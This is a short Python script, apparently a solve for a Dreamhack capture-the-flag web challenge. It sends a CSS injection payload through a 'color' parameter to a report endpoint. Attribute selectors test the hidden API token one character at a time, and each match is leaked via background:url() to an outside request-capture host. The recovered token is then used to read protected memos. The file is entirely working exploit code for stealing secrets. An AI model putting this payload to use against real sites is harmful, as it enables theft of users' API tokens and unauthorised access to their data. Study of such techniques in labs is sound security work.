import requests
from string import ascii_lowercase

port = 10726
url_index = f"http://host3.dreamhack.games:{port}/"
url_report = url_index + "report"
url_memo = url_index + "/api/memo"

cand = ascii_lowercase

# token을 처음에 빈 걸로 시작하여, 한 글자씩 확인하고 수동적으로 추가 (자동적으로 하는 방법은 추후 모색)
token = "espcquqboibrvynz"
for l in cand:
    exploit = (
        "yellow}input[id=InputApitoken][value="
        + token
        + l
        + "]{background:url(https://vzxelxf.request.dreamhack.games/"
        + token
        + l
        + ")"
    )
    param = {"path": "mypage?color=" + exploit}
    r = requests.post(url_report, data=param)

headers = {"API-KEY": token}

r = requests.get(url_memo, headers=headers)
print(r.text)
